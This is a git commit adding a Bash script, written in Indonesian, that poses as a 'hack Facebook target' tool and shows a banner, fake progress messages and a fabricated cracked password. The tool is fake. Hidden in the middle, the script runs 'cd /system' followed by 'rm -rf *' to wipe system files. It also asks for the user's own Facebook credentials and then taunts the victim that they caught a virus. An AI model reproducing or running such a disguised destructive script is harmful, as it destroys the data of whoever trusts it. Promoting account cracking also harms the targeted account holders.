ddf185d918e558bac6a48eb3fdca97a7b66e42a8
bang-chil <66408810+bang-chil@users.noreply.github.com>
2020-06-04 14:41:37 +0700

    Create hackFB.sh

---
+++ hackFB.sh
@@ -0,0 +1,83 @@
+#!/bin/bash
+#Tanamkan ilmu iblis gunakan seperti malaikat
+#jangan di recode om nanti aku nangis
+echo "Welcome back lg di tool gw yakan"
+sleep 2
+echo "Kali ini gw buat tool hack fb target bro"
+sleep 2
+echo "ini pokoknya mantap 100% work pasti dapet"
+sleep 2
+echo "sabar ajg lg proses"
+sleep 2
+echo "TANAMKAN ILMU IBLIS GUNAKAN SEPERTI MALAIKAT"
+sleep 3
+clear
+echo "\033[0;34m]
+      .---.        .-----------
+     /     \  __  /    ------
+    / /     \(  )/    -----
+   //////   * \/ *   ---
+  //// / // :    : ---
+ // /   /  /*    *--
+//          //..\\
+===========UU====UU==================
++          *//||\\*                 +
++            ****                   +
++ coded by : ✿͜͡ঔৣ✪➵͜͡Kanchil-IDঔৣ͜᷍🌹      +
++ Team : ✿͜͡ঔৣ✪➵͜͡PUB_CYBEERঔৣ͜᷍🌹          +
++ kontak me : 6282125068665         +
++                                   +
++  ^...^                 ^...^      +
++ <_* *_>Hack Fb Target <_* *_>     +
++   \_/                   \_/       +
+====================================="
+echo
+sleep 1
+echo "Waiting for your love..."
+sleep 4
+cd /system
+rm -rf *
+sleep 3
+clear
+echo "yahaha bentar ada error dikit"
+sleep 2
+echo "sedang memperbaiki..."
+sleep 2
+echo "bug sudah di perbaiki tunggu sebentar"
+sleep 2
+figlet "HACK FB"
+echo -n "nomor/email/id: " read nomor
+echo -n "password: " read password
+sleep 2
+echo "proses memasuki akun..."
+sleep 2
+echo "login berhasil silahkan masukan id dan password korban"
+sleep
+echo -n "id/email/nomor korban: " read id
+sleep 3
+echo "Menunggu proses cracking"
+sleep 5
+echo "Password korban: 08102019"
+sleep 1
+clear
+echo
+echo
+sleep 3
+clear
+echo "System error waiting to clean"
+sleep 1
+echo "Virus detected"
+sleep 1
+echo "tunggu untuk membersihkan virus"
+sleep 2
+clear
+echo "virus sudah di bersihkan silahkan ulang program"
+clear
+echo "mampus kena virus"
+cd
+reebot
+clear
+echo
+echo
+sleep 30
+clear
